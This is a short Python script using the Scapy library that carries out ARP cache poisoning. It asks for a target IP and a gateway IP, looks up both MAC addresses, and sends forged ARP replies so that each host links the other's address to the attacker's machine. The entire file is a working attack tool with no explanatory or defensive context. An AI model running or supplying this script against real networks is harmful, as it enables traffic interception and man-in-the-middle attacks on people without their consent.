from scapy.all import *

def getmac(srcip, dstip):
	arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=dstip, psrc=srcip)
	targetmac= srp(arppacket, timeout=2 , verbose= False, iface="eth0")[0][0][1].hwsrc
	return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
	spoofed= Ether(dst=targetmac)/ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
	sendp(spoofed, verbose= False, iface="eth0")

def main():
	targetip= raw_input("Enter Target IP:")
	gatewayip= raw_input("Enter Gateway IP:")

	try:
		targetmac= getmac(gatewayip, targetip)
		print "Target MAC", targetmac
	except:
		print "Target machine did not respond to ARP broadcast"
		quit()

	try:
		gatewaymac= getmac(targetip, gatewayip)
		print "Gateway MAC:", gatewaymac
	except:
		print "Gateway is unreachable"
		quit()
	try:
		print "Sending spoofed ARP responses"
		spoofarpcache(targetip, targetmac, gatewayip)
		spoofarpcache(gatewayip, gatewaymac, targetip)
	except KeyboardInterrupt:
		print "ARP spoofing stopped"
		quit()

if __name__=="__main__":
	main()
